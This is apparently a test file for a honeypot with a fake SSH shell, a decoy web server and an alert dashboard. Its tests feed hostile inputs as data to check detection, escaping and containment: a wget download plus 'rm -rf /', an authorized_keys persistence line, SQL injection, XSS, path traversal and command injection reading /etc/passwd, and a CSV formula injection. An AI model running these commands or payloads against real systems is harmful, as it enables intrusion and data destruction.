"""Unit + integration tests. Run:  python -m unittest discover -s tests -v   (from project root)"""
import http.client
import os
import sys
import tempfile
import time
import unittest
import urllib.parse

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import paramiko  # noqa: E402

from config import Config  # noqa: E402
from dashboard import render_page  # noqa: E402
from detector import classify_command, classify_http  # noqa: E402
from honeypot import build  # noqa: E402
from ssh_honeypot import run_fake_command_line  # noqa: E402


class TestClassifiers(unittest.TestCase):
    def test_command_tags(self):
        self.assertIn("download", classify_command("wget http://x/a.sh"))
        self.assertIn("execution", classify_command("chmod +x a.sh"))
        self.assertIn("persistence", classify_command("echo key >> ~/.ssh/authorized_keys"))
        self.assertIn("recon", classify_command("uname -a"))
        self.assertEqual(classify_command("echo hello"), [])

    def test_http_tags(self):
        self.assertIn("sqli", classify_http("/s?q=" + urllib.parse.quote("' OR 1=1 --"), "", ""))
        self.assertIn("xss", classify_http("/p?x=<script>alert(1)</script>", "", ""))
        self.assertIn("traversal", classify_http("/d?f=../../etc/passwd", "", ""))
        self.assertIn("cmd-injection", classify_http("/ping?h=" + urllib.parse.quote("1;cat /etc/passwd"), "", ""))
        self.assertIn("scanner", classify_http("/", "", "Mozilla/5.00 (Nikto/2.1.6)"))
        self.assertIn("path-probe", classify_http("/.env", "", "Mozilla"))
        self.assertEqual(classify_http("/index.html?page=2", "", "Mozilla/5.0"), [])


class TestFakeShell(unittest.TestCase):
    cfg = Config()

    def test_never_executes(self):
        out, _ = run_fake_command_line(self.cfg, "root", "wget http://203.0.113.9/x.sh; rm -rf /")
        self.assertIn("unable to resolve host", out)
        self.assertTrue(os.path.exists("/"))          # sanity: nothing was really run

    def test_canned_replies(self):
        self.assertEqual(run_fake_command_line(self.cfg, "root", "whoami")[0], "root\n")
        self.assertTrue(run_fake_command_line(self.cfg, "root", "exit")[1])
        self.assertIn("command not found", run_fake_command_line(self.cfg, "root", "foobar")[0])


class TestIntegration(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = tempfile.mkdtemp()
        cls.cfg = Config(ssh_port=0, http_port=0, dash_port=0,
                         db_path=os.path.join(cls.tmp, "t.db"), host_key_path=os.path.join(cls.tmp, "k.pem"),
                         bf_threshold=3)
        cls.store, cls.det, cls.ssh, cls.http, cls.dash = build(cls.cfg)
        for s in (cls.ssh, cls.http, cls.dash):
            s.start()

    @classmethod
    def tearDownClass(cls):
        for s in (cls.ssh, cls.http, cls.dash):
            s.stop()

    def _ssh(self, user, pwd):
        c = paramiko.SSHClient()
        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        c.connect("127.0.0.1", self.ssh.port, user, pwd, allow_agent=False, look_for_keys=False, timeout=10)
        return c

    def test_1_ssh_rejects_strong_password(self):
        with self.assertRaises(paramiko.AuthenticationException):
            self._ssh("root", "Xk9$notInList")

    def test_2_ssh_weak_login_and_command_logged(self):
        c = self._ssh("root", "toor")
        _, out, _ = c.exec_command("whoami")
        self.assertEqual(out.read().decode().strip(), "root")
        c.close()
        time.sleep(0.3)
        cmds = [r[0] for r in self.store.top_commands(20)]
        self.assertIn("whoami", cmds)
        self.assertGreaterEqual(self.store.summary()["successful_logins"], 1)

    def test_3_bruteforce_alert(self):
        for i in range(4):
            try:
                self._ssh("admin", f"wrong-{i}-zz")
            except paramiko.AuthenticationException:
                pass
        time.sleep(0.3)
        rules = [r[2] for r in self.store.recent_alerts(30)]
        self.assertIn("SSH-BRUTE-FORCE", rules)

    def test_4_http_logging_and_sqli_alert(self):
        conn = http.client.HTTPConnection("127.0.0.1", self.http.port, timeout=5)
        conn.request("GET", "/search?q=" + urllib.parse.quote("' OR 1=1 --"))
        r = conn.getresponse()
        self.assertEqual(r.status, 404)
        self.assertIn("Apache", r.getheader("Server"))
        conn.close()
        time.sleep(0.2)
        self.assertIn("WEB-SQL-INJECTION", [r[2] for r in self.store.recent_alerts(30)])

    def test_5_http_login_never_succeeds_and_is_recorded(self):
        conn = http.client.HTTPConnection("127.0.0.1", self.http.port, timeout=5)
        conn.request("POST", "/login", "username=admin&password=hunter2",
                     {"Content-Type": "application/x-www-form-urlencoded"})
        body = conn.getresponse().read().decode()
        conn.close()
        self.assertIn("Invalid username or password", body)
        self.assertIn(("hunter2", 1), self.store.top_field("password", 50))

    def test_6_dashboard_escapes_attacker_html(self):
        self.store.add_event("http", "127.0.0.1", 1, "auth_attempt", username="<script>alert(1)</script>",
                             password="<img src=x onerror=alert(2)>")
        page = render_page(self.store)
        self.assertNotIn("<script>alert(1)</script>", page)
        self.assertNotIn("<img src=x", page)
        self.assertIn("&lt;script&gt;", page)

    def test_7_csv_formula_injection_neutralised(self):
        self.store.add_event("ssh", "127.0.0.1", 2, "auth_attempt", username="=cmd|' /C calc'!A0", password="x")
        self.assertNotIn("\n=cmd", self.store.export_csv())


if __name__ == "__main__":
    unittest.main(verbosity=2)
